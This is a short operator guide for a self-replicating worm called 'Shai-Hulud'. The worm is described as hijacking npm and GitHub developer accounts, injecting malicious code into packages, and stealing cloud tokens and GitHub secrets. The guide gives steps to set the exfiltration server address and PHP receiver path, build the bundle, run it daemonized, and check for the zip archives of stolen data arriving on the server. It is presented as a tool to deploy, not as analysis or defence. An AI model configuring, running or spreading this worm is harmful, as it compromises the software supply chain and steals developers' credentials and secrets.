Shai-Hulud , self-replicating worm targeting the NPM and GitHub ecosystems.

    Target: Hijacks JavaScript developer accounts and infects open-source packages.
    Spread: Automatically injects malicious code into dependencies to compromise new victims.
    Goal: Steals cloud tokens, GitHub secrets.

Worm Configuration and Execution

COMMAND SERVER SETUP

To configure the program to send data to your server, change the domain and path in src/index.ts (lines 29-35):

domain: "127.0.0.1", ← change to your server address port: 80, ← 80 for HTTP, 443 for HTTPS path: "x.php", ← path to your PHP script

STEP 1: DEPLOY THE PHP SCRIPT ON YOUR SERVER

On your server (e.g., your-server.com), place a PHP script that receives and saves files.

Make sure your web server (Apache/Nginx) is running and PHP is configured to handle POST requests.

STEP 2: BUILD

bun install bun run build

Output: dist/bundle.js
STEP 3: RUN

Foreground: bun run dist/bundle.js

Background (daemonized): CI=false __DAEMONIZED=1 bun run dist/bundle.js

The program will collect data and send it to your server.
VERIFICATION

Files named data_YYYY-MM-DD_HH-MM-SS.zip will appear on your server. Check receive.log for delivery confirmation.
